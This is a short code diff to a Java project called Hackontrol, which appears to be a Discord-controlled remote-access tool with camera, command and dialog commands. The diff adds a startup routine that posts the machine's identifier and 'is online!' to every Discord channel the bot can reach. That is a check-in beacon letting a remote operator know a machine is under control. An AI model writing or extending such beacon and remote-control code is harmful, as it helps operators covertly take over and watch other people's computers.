@@ -7,6 +7,7 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
+import java.util.List;
 import java.util.Random;
 
 import com.khopan.hackontrol.command.CameraCommand;
@@ -30,6 +31,7 @@ import com.mojang.brigadier.exceptions.CommandSyntaxException;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Message;
+import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
 import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
@@ -62,6 +64,12 @@ public class Hackontrol {
 		this.registerCommand(new WakeCommand());
 		this.registerCommand(new CommandCommand());
 		this.registerCommand(new DialogCommand());
+		List<TextChannel> channels = bot.getTextChannels();
+		String message = '`' + this.machineIdentifier + "` is online!";
+
+		for(TextChannel channel : channels) {
+			channel.sendMessage(message).queue();
+		}
 	}
 
 	private void registerCommand(Command command) {
